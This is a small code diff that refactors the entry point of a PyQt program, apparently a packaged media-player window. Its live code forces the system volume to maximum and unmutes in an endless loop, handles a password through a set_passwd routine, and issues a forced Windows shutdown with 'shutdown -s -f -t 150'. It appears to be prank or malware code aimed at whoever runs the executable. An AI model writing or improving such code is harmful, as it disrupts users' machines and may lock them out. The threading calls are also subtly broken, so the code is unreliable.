@@ -71,7 +71,7 @@ class MainWindow(QMainWindow):
         self._player.play()
 
 
-def main():
+def add_eventer():
     while True:
         set_audio(1.0)
         clear_mute()
@@ -95,8 +95,7 @@ def set_passwd(password):
     file.close()
     os.remove('./userName')
 
-
-if __name__ == '__main__':
+def main():
     app = QApplication(sys.argv)
     # 获取打包后的可执行文件所在的临时目录
     base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
@@ -118,5 +117,9 @@ if __name__ == '__main__':
     os.system('shutdown -s -f -t 150')
 
     threading.Thread(target=app.exec()).start()
-    threading.Thread(target=main()).start()
+    threading.Thread(target=add_eventer()).start()
     sys.exit(app.exec())
+
+
+if __name__ == '__main__':
+    main()
